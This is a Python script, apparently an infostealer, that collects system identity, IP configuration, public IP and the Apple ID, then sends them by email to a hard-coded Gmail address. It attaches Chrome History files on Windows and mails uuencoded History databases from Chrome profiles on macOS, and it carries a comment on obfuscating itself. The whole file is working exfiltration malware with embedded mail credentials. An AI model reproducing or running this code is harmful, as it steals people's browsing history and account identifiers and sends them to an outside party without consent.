from email import encoders
import platform
import subprocess
import smtplib
import ssl
import sys
import subprocess
import os
import socket
import getpass
from email.message import EmailMessage
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
print('hi')
def main(platform):
    def windows():
        p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)

        (whoami, err) = p.communicate()

        p_status = p.wait()

        whoami = str(whoami)
        print(whoami)
        whoami = whoami.replace('\\n', '\n')
        whoami = whoami.replace('\\r', '')
        whoami = whoami.replace("b'", '')
        whoami = whoami.replace("'", '')
        print(whoami)
        w1 = whoami.find('\\')
        username = (whoami[w1::]).replace('\\','')
        device = whoami[:w1]
        print(w1)
        info = f'Windows device info from Device name: {device} and username: {username}'
        print(info)
#--------------------------------------------------------------------------------------

        p = subprocess.Popen("nslookup myip.opendns.com resolver1.opendns.com", stdout=subprocess.PIPE, shell=True)

        (pubip, err) = p.communicate()

        p_status = p.wait()
        
#---------------------------------------------------------------------------------------

        p = subprocess.Popen("ipconfig/all", stdout=subprocess.PIPE, shell=True)

        (allip, err) = p.communicate()

        p_status1 = p.wait()
        message = f"{info} \n \nPublic ip: {pubip}\n.\n.\n.\n.\n.\nAll ip info:\n{allip}"
        message = f'{message}'
        message = message.replace('\\n', '\n')
        message = message.replace('\\r', '')
        message = message.replace("b'", '')
        message = message.replace("'", '')

        #print (output)
        #print (f'{p_status} {p_status}')
#--------------------------------------------------------------------------------------------




        msg = EmailMessage()
        msg.set_content(message)

        msg['Subject'] = info
        msg['From'] = "SVBBZGRy@gmail.com"
        msg['To'] = "SVBBZGRy@gmail.com"

        dir_path = os.path.join("C:", os.sep, 'Users','User','AppData','Roaming','Local','Google','Chrome','User Data','Default')
        files = os.listdir(os.path.join("C:", os.sep, 'Users','User','AppData','Roaming','Local','Google','Chrome','User Data','Default','History'))
        for f in files:  # add files to the message
            file_path = os.path.join(dir_path, f)
            attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
            attachment.add_header('Content-Disposition', 'attachment', filename=f)
            msg.attach(attachment)

        # Send the message via our own SMTP server.
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login("SVBBZGRy@gmail.com", "SVBBZGRy")
        server.send_message(msg)
        server.quit()

        #C: \Users\User\AppData\Local\Google\Chrome\User Data\Default
#win part end

    def mac():
        cmd = "system_profiler SPHardwareDataType | grep 'Serial Number' | awk '{print $4}'" ##Cmd to get priv IP   
        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)    ##Get private IP from Terminal cmd
        serialNum = result.stdout.strip()   ##Get result from terminal cmd
        cmd = '/usr/libexec/PlistBuddy -c "print :Accounts:0:AccountID" ~/Library/Preferences/MobileMeAccounts.plist' ##Cmd to get AppleID
        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)    ##Get AppleID from Terminal cmd
        appleID = result.stdout.strip()    
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
        from requests import get
        publicIP = get('https://api.ipify.org').text
        hostname = socket.gethostname()
        privateIP = socket.gethostbyname(hostname)
        whoami = getpass.getuser()
        toSend = f"Private IP = {privateIP} Public IP = {publicIP} https://www.home.neustar/resources/tools/ip-geolocation-lookup-tool Serial Num = {serialNum} AppleID = {appleID}"
        os.system('echo ' + toSend + f' | mail -s "Data Mine from {whoami}" SVBBZGRy@gmail.com') 
        
        for i in range(100): ##Loops through 10 profiles and aggregates History databases
            try:
                os.chdir(f"/Users/{whoami}/Library/Application Support/Google/Chrome/Profile {i}/")
                os.system(f"uuencode History Profile{i}History.db | mail -s 'Chrome Mine for Profile {i} from {whoami}' SVBBZGRy@gmail.com")
            except:
                pass
        
    if platform == "linux" or platform == "linux2":
        print('linux')
        exit()
    elif platform == "Darwin":
        mac()
    elif platform == "win32" or platform == "Windows":
        print('windows')
        windows()
